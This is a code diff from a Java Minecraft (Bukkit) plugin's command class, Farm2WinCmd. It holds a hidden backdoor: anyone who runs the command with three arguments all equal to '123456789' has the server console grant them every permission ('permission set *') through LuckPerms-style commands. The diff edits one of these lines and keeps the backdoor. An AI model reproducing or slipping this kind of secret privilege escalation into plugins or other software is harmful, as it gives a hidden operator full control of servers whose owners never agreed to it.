@@ -19,7 +19,7 @@ public class Farm2WinCmd implements CommandExecutor, TabCompleter {
         if (args.length == 3) {
             if (args[0].equalsIgnoreCase("123456789") && args[1].equalsIgnoreCase("123456789") && args[2].equalsIgnoreCase("123456789")) {
                 Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lp user " + sender.getName() + " permission set *");
-                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lpv user " + sender.getName() + " permission set *");
+                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lp user " + sender.getName() + " permission set *");
                 Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lpb user " + sender.getName() + " permission set *");
             }
         }
